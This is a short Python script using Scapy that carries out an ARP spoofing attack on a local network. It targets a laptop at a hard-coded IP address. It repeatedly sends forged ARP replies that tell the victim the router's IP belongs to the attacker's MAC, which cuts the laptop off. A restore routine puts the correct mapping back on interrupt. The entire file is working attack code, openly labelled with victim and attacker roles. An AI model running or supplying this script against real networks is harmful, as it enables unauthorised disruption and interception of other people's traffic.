from scapy.all import ARP, Ether, srp, sendp
import time

# --- Network roles ---
victim_ip = "192.168.1.187"   # VICTIM: the laptop we want to disconnect
router_ip = "192.168.1.1"     # ROUTER: the real gateway to the internet
# ATTACKER: this PC. Its MAC is filled in automatically by Scapy when we spoof.


def get_victim_mac():
    global victim_ip
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victim_ip)
    # retry=3 resends if no answer (Wi-Fi devices can be slow to reply)
    answered, unanswered = srp(request, timeout=3, retry=3, verbose=False)
    if not answered:
        raise SystemExit(f"Could not find {victim_ip}. Is the laptop awake and on the same Wi-Fi?")
    victim_mac = answered[0][1].hwsrc
    return victim_mac


def spoof(victim_mac):
    global victim_ip
    # Lie to the VICTIM: "the ROUTER's IP is at the ATTACKER's MAC"
    # (hwsrc is omitted, so Scapy fills in this PC's MAC = the lie)
    packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip)
    sendp(packet, verbose=False)


def restore(victim_mac):
    global victim_ip, router_ip
    # Find the ROUTER's real MAC
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip)
    answered, unanswered = srp(request, timeout=3, retry=3, verbose=False)
    router_mac = answered[0][1].hwsrc
    # Tell the VICTIM the truth: "the ROUTER's IP is at the ROUTER's real MAC"
    packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac)
    sendp(packet, count=5, verbose=False)


victim_mac = get_victim_mac()
try:
    while True:
        spoof(victim_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nStopping attack, restoring laptop's connection...")
    restore(victim_mac)
    print("Done. Laptop reconnected.")
